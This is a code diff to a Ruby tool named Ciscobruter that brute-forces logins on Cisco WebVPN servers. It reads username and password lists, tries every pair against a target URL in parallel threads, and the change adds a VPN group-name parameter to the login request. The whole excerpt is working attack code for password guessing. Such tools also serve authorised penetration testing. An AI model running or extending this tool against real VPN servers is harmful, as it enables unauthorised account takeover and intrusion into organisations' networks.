@@ -16,7 +16,8 @@ args = OptionParser.new do |opts|
   opts.on("-U", "--user-file  [File Path]", "\tFile containing list of usernames") { |usernames| options[:usernames] = File.open(usernames, 'r').read.split("\n") }
   opts.on("-P", "--pass-file  [File Path]", "\tFile containing list of passwords") { |passwords| options[:passwords] = File.open(passwords, 'r').read.split("\n") }
   opts.on("-t", "--target     [URL]", "\tTarget VPN server example: https://vpn.target.com") { |target| options[:target] = target }
-  opts.on("-l", "--login-path  [Login Path]", "\tPath to login page.  Default: /+webvpn+/index.html") { |path| options[:path] = path }
+  opts.on("-l", "--login-path [Login Path]", "\tPath to login page.  Default: /+webvpn+/index.html") { |path| options[:path] = path }
+  opts.on("-g", "--group      [Group Name]", "\tGroup name for VPN.  Default: No Group") { |group| options[:group] = group }
   opts.on("-v", "--verbose", "\tEnables verbose output\r\n\r\n") { |v| options[:verbose] = true }
 end
 
@@ -38,11 +39,12 @@ end
 
 class Ciscobruter
 
-	attr_accessor :uri, :http, :headers, :verbose, :path
+	attr_accessor :uri, :http, :headers, :verbose, :path, :group
 
-	def initialize(target, verbose=nil, login=nil)
+	def initialize(target, verbose=nil, login=nil, group=nil)
 		self.uri = URI.parse(target)
 		self.path = set_path(login)
+		self.group = group
 		self.http = setup_http
 		self.headers = { 'Cookie' => 'webvpnlogin=1; webvpnLang=en' }
 		self.verbose = verbose
@@ -51,6 +53,11 @@ class Ciscobruter
 	def try_credentials(username, password)
 		info "Trying username: #{username} and password: #{password} on #{uri.host}" if verbose
 		post = "username=#{username}&password=#{password}"
+
+		if group != nil
+			post += "&group_list=#{group}"
+		end
+
 		response = http.post(path, post, headers)
 		if response.code == "200"
 			if validate_credentials(response.body)
@@ -92,7 +99,7 @@ def main(options, total)
 	options[:usernames].each do |username|
 		options[:passwords].each do |password|
 			threads.process {
-				bruter = Ciscobruter.new(options[:target], options[:verbose], options[:path])
+				bruter = Ciscobruter.new(options[:target], options[:verbose], options[:path], options[:group])
 				bruter.try_credentials(username.chomp, password.chomp)
 				PROGRESS.increment
 			}
